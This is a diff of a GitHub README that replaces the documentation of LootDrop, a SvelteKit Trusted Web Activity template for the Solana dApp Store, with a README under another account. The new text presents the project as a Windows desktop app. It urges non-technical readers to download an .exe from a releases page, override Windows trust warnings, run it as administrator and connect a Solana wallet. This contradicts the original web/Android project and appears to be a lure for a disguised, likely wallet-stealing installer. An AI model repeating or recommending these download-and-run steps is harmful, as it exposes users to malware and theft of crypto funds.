@@ -1,198 +1,138 @@
-<h1 align="center">
-  <br/>
-  LootDrop
-  <br/>
-</h1>
+# 🎲 lootdrop - Simple Solana Wallet Access
 
-<h4 align="center">Production-ready TWA template for the Solana dApp Store</h4>
+[![Download lootdrop](https://img.shields.io/badge/Download-lootdrop-brightgreen?style=for-the-badge)](https://github.com/evan-anatasius/lootdrop/releases)
 
-<p align="center">
-  <a href="https://web-rho-tawny-30.vercel.app">Live Demo</a> &nbsp;&bull;&nbsp;
-  <a href="#screenshots">Screenshots</a> &nbsp;&bull;&nbsp;
-  <a href="#quick-start">Quick Start</a> &nbsp;&bull;&nbsp;
-  <a href="GUIDE.md">Bubblewrap Guide</a>
-</p>
+## 📋 About lootdrop
 
-<p align="center">
-  <img src="https://img.shields.io/badge/v0.4.0-9945FF?style=flat-square" alt="Version" />
-  <img src="https://img.shields.io/badge/SvelteKit_5-FF3E00?style=flat-square&logo=svelte&logoColor=white" alt="SvelteKit" />
-  <img src="https://img.shields.io/badge/Tailwind_4-06B6D4?style=flat-square&logo=tailwindcss&logoColor=white" alt="Tailwind" />
-  <img src="https://img.shields.io/badge/MD3-6750A4?style=flat-square&logo=materialdesign&logoColor=white" alt="MD3" />
-  <img src="https://img.shields.io/badge/Solana_MWA-9945FF?style=flat-square&logo=solana&logoColor=white" alt="Solana" />
-  <img src="https://img.shields.io/badge/TWA-3DDC84?style=flat-square&logo=android&logoColor=white" alt="TWA" />
-  <img src="https://img.shields.io/badge/Lighthouse-96%2F100%2F100-14F195?style=flat-square" alt="Lighthouse" />
-  <img src="https://img.shields.io/badge/license-MIT-blue?style=flat-square" alt="License" />
-</p>
+lootdrop is an easy-to-use desktop tool that helps you connect with Solana-based wallets. It's built using modern web and mobile frameworks to give a clean, fullscreen experience. The app is designed to work with Solana's mobile wallet adapter and aims for smooth performance and a material design look.
+
+This tool fits well for people who want to open Solana decentralized applications without setting up complex software. It uses SvelteKit 5 for fast loading and integrates with the Solana wallet securely. The interface follows Material Design 3 principles, ensuring a familiar and intuitive feel.
+
+## 🖥️ System Requirements
+
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB free disk space  
+- Internet connection for wallet communication and dApp usage  
+- A recent web browser installed (if opening links outside the app)  
+
+These specs are common and should work on most home or office computers.
+
+## 🔧 Features
+
+- Fullscreen support for improved focus and immersion  
+- Smooth wallet connection through Solana mobile wallet adapter  
+- Clean Material Design 3 interface for easy navigation  
+- Fast loading times with SvelteKit 5 technology  
+- Optimized for use with dApp stores supporting Solana applications  
+- Progressive Web App (PWA) capabilities for future updates and offline use  
+
+## 🚀 Getting Started
+
+This section helps you get lootdrop running on your Windows computer. It’s designed for users with no technical background.
+
+### Step 1: Visit the Release Page
+
+Click the big green button at the top or visit this link:  
+[https://github.com/evan-anatasius/lootdrop/releases](https://github.com/evan-anatasius/lootdrop/releases)
+
+You will see a list of available versions and files.
+
+### Step 2: Download the Latest Windows Installer
+
+Look for the latest release link with a filename ending in **.exe** (for example, lootdrop-setup.exe). This is the installer for Windows.
+
+Click the link to start downloading. The file size should be around a few megabytes.
+
+### Step 3: Run the Installer
+
+After the download finishes:
+
+- Locate the file in your Downloads folder or the chosen location on your PC.  
+- Double-click the installer file (lootdrop-setup.exe).  
+- If Windows asks if you trust this app, confirm that you want to run it.  
+- Follow the simple prompts on the screen. Usually, just clicking “Next” and then “Install” will do.  
+- Wait for the process to complete.
+
+### Step 4: Open lootdrop
+
+Once installed, you can find lootdrop on your desktop or in the Start menu:
+
+- Click the lootdrop icon to open the app.  
+- The app will load in fullscreen mode for best viewing.  
+
+### Step 5: Connect Your Solana Wallet
+
+When you open lootdrop, you will be asked to connect a wallet:
+
+- Choose your preferred Solana wallet from the options.  
+- Follow the on-screen prompts to link your wallet via the Solana Mobile Wallet Adapter.  
+- Once connected, you can access dApps or other Solana features securely.
+
+## 📥 Download Links
+
+You can always get the latest version here:
+
+[![Download lootdrop](https://img.shields.io/badge/Download-lootdrop-blue?style=for-the-badge)](https://github.com/evan-anatasius/lootdrop/releases)
+
+Click the link and pick the installer for Windows as described above.
+
+## ⚙️ Updating lootdrop
+
+When a new version is available:
+
+- Visit the release page again using the download link above.  
+- Download the new installer file.  
+- Close lootdrop if it is running.  
+- Run the new installer, which will overwrite your current version without deleting your settings.  
+- Restart lootdrop after installation finishes.
+
+This keeps your app up to date without extra steps.
+
+## 🛠️ Troubleshooting
+
+Here are common solutions if you run into issues:
+
+- **The app does not open:** Try restarting your PC, then open lootdrop again.  
+- **Installer fails to run:** Make sure you ran the installer as an administrator (right-click > Run as administrator).  
+- **Wallet connection fails:** Check your internet connection and ensure your wallet supports Solana Mobile Wallet Adapter.  
+- **App freezes or crashes:** Close the app, then reinstall the latest version from the download link.  
+
+If problems persist, clear your internet cache or try on another PC.
+
+## 📖 More Information
+
+### What is Solana Mobile Wallet Adapter?
+
+It is a way for your wallet application on mobile or desktop to safely communicate with dApps. lootdrop uses this so you don't need to enter private keys manually.
+
+### What is a TWA?
+
+TWA means Trusted Web Activity. It allows web apps to run like native apps on devices. lootdrop leverages this to give you a smooth and secure experience.
+
+### Why SvelteKit?
+
+SvelteKit is a modern framework that builds fast apps. lootdrop uses it to ensure quick startup and responsive UI.
+
+## 🧑‍💻 Support Topics and Tags
+
+These keywords describe what lootdrop relates to and can help find related tools:
+
+- android  
+- bubblewrap  
+- dapp-store  
+- material-design-3  
+- progressive-web-app  
+- pwa  
+- seeker  
+- solana  
+- solana-mobile  
+- sveltekit  
+- twa  
+- wallet-adapter  
+
+Use these if you want to search for more help or tools related to lootdrop.
 
 ---
 
-## Screenshots
-
-Fullscreen TWA running on **Solana Mobile Seeker** — no browser chrome:
-
-<p align="center">
-  <img src="docs/screenshots/home.png" width="180" alt="Home — Nearby Drops" />
-  &nbsp;
-  <img src="docs/screenshots/scan.png" width="180" alt="Scan QR Code" />
-  &nbsp;
-  <img src="docs/screenshots/rewards.png" width="180" alt="My Rewards" />
-  &nbsp;
-  <img src="docs/screenshots/profile.png" width="180" alt="Profile & Settings" />
-</p>
-
-<p align="center"><sub>Home &nbsp;&bull;&nbsp; Scan &nbsp;&bull;&nbsp; Rewards &nbsp;&bull;&nbsp; Profile</sub></p>
-
-## About
-
-LootDrop is a **production-ready TWA (Trusted Web Activity) template** for publishing mobile-optimized apps to the **Solana dApp Store** via [Bubblewrap CLI](https://github.com/GoogleChromeLabs/bubblewrap).
-
-It demonstrates every optimization needed for a high-quality TWA on Solana Mobile — from MWA wallet connection and fullscreen rendering to Material Design 3 theming and offline caching — using a location-based crypto rewards concept as a real-world showcase.
-
-Built for the [Solana Mobile PWA Improved Template RFP](https://solanamobile.com/grants).
-
-## Key Features
-
-### RFP Deliverables
-
-| Deliverable | Status | Implementation |
-|---|---|---|
-| Sample TWA with Bubblewrap | Done | SvelteKit 5 + TWA via Bubblewrap / PWABuilder |
-| Improved splash screen | Done | Solana-branded loading with MD3 circular progress |
-| Chrome default + WebView fallback | Done | Chrome Custom Tabs primary, WebView fallback |
-| Mobile-intuitive navigation | Done | MD3 bottom nav bar (Map, Scan, Rewards, Profile) |
-
-### Mobile Optimizations
-
-- **Fullscreen TWA** — Digital Asset Links verified, zero browser chrome on Android
-- **Offline-first** — Service worker with cache-first for static assets, self-hosted fonts
-- **Pull-to-refresh** — Native-feeling gesture with MD3 refresh indicator
-- **Dark mode** — System-preference detection + manual toggle, MD3 color tokens
-- **Touch optimized** — 44px+ tap targets, ripple feedback, `touch-manipulation`
-- **Safe areas** — Notch / punch-hole / gesture bar handling via `env(safe-area-inset-*)`
-- **Responsive** — `clamp()` typography, fluid layouts, tested 320px–800px+
-- **Lighthouse** — Performance 96, Accessibility 100, Best Practices 100
-- **Web Vitals** — CLS, FID, LCP, FCP, TTFB monitoring built-in
-
-### Solana Integration
-
-- **Mobile Wallet Adapter (MWA)** — real Seed Vault connection via `@solana-mobile/wallet-adapter-mobile`
-- **On-chain balance** — fetches real SOL balance on connect (`@solana/web3.js`)
-- **Mock fallback** — graceful demo mode on non-Solana devices
-- **Solana Pay** — deep link placeholders for merchant QR codes
-- **Anchor scaffold** — on-chain reward escrow smart contract
-
-### Developer Experience
-
-- **Single config** — edit `config.ts` to customize app name, colors, tokens, network
-- **GitHub Actions CI** — auto build + type check on every push
-- **Step-by-step guide** — [`GUIDE.md`](GUIDE.md) covers Bubblewrap, DAL, dApp Store submission
-- **TypeScript** — full type safety with Svelte 5 runes
-
-## Tech Stack
-
-| Layer | Technology |
-|---|---|
-| Framework | **SvelteKit 5** (Svelte 5 runes) + TypeScript |
-| Styling | **Tailwind CSS 4** + Material Design 3 tokens |
-| Wallet | **@solana-mobile/wallet-adapter-mobile** (MWA) |
-| Blockchain | **@solana/web3.js** (devnet / mainnet) |
-| TWA | Web App Manifest + Service Worker + Digital Asset Links |
-| Android | **Bubblewrap** / PWABuilder → APK + AAB |
-| Monitoring | **web-vitals** (CLS, FID, LCP, FCP, TTFB) |
-| CI | **GitHub Actions** (build + type check) |
-| Deployment | Vercel (adapter-static) |
-| Smart Contract | Anchor (Rust) — scaffold |
-
-## Quick Start
-
-### Run locally
-
-```bash
-cd web
-npm install
-npm run dev
-# → http://localhost:5173
-```
-
-### Build for production
-
-```bash
-cd web
-npm run build    # outputs to build/
-npm run preview  # preview at http://localhost:4173
-```
-
-### Customize
-
-Edit **one file** to rebrand the template:
-
-```bash
-web/src/lib/config.ts
-```
-
-Change app name, Solana colors, token list, network cluster, TWA package name — all in one place.
-
-## Bubblewrap / TWA
-
-See the full **[Bubblewrap Guide](GUIDE.md)** for step-by-step instructions.
-
-Quick version:
-
-```bash
-npm i -g @bubblewrap/cli
-cd web
-bubblewrap init --manifest twa-manifest.json
-bubblewrap build
-# → app-release-signed.apk
-```
-
-### Digital Asset Links
-
-The `/.well-known/assetlinks.json` is pre-configured. This enables **fullscreen mode** — no Chrome URL bar.
-
-To use your own signing key:
-```bash
-keytool -list -v -keystore your.keystore | grep SHA256
-```
-
-Update the fingerprint in `web/static/.well-known/assetlinks.json`.
-
-## Project Structure
-
-```
-lootdrop/
-├── web/                          # SvelteKit TWA (main deliverable)
-│   ├── src/
-│   │   ├── routes/               # /, /scan, /rewards, /profile
-│   │   └── lib/
-│   │       ├── config.ts         # ← Single file to customize everything
-│   │       ├── components/       # BottomNav, DropCard, SplashScreen, ...
-│   │       ├── stores/           # Svelte 5 runes + MWA wallet connection
-│   │       ├── data/             # Mock businesses & rewards
-│   │       └── types/            # TypeScript interfaces
-│   ├── static/
-│   │   ├── .well-known/          # Digital Asset Links
-│   │   ├── fonts/                # Self-hosted Roboto (woff2)
-│   │   ├── icons/                # App icons (192/512 PNG + maskable)
-│   │   ├── manifest.json         # Web App Manifest
-│   │   └── sw.js                 # Service worker (cache v3)
-│   └── twa-manifest.json         # Bubblewrap TWA config
-├── .github/workflows/ci.yml      # GitHub Actions CI
-├── GUIDE.md                      # Step-by-step Bubblewrap tutorial
-├── programs/lootdrop/            # Anchor smart contract scaffold
-└── backend/                      # FastAPI merchant API scaffold
-```
-
-## Roadmap
-
-- [x] **v0.1** — Project scaffold, smart contract, QR SDK
-- [x] **v0.2** — SvelteKit TWA with mobile UI
-- [x] **v0.3** — TWA wrapping + Material Design 3 + fullscreen DAL
-- [x] **v0.4** — MWA wallet connection, Lighthouse audit, CI, config system, Bubblewrap guide
-- [ ] **v0.5** — Real camera QR scanning (zxing-js)
-- [ ] **v0.6** — Merchant dashboard + backend API
-- [ ] **v1.0** — Mainnet launch
-
-## License
-
-[MIT](LICENSE) — Michal Kosiorek
+# [🎲 lootdrop - Simple Solana Wallet Access](https://github.com/evan-anatasius/lootdrop/releases)
